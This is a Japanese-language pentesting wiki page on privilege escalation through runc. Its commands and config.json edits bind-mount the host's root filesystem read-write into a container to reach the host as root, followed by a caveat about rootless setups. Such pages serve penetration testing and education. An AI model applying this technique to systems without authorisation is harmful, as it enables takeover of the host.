# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

**runc** について詳しく学びたい場合は、次のページを確認してください。

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

ホストに `runc` がインストールされていることがわかった場合、ホストの `root /` フォルダをマウントした **container** を実行できる可能性があります。
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> これは常に機能するとは限りません。runc のデフォルト動作は root として実行することであるため、非特権ユーザーとして実行しても、単純には機能しません（rootless configuration がある場合を除きます）。rootless configuration をデフォルトにすることは、一般的には良い考えではありません。rootless containers 内には、rootless containers の外部には適用されない制限がかなり多く存在するためです。

{{#include ../../banners/hacktricks-training.md}}
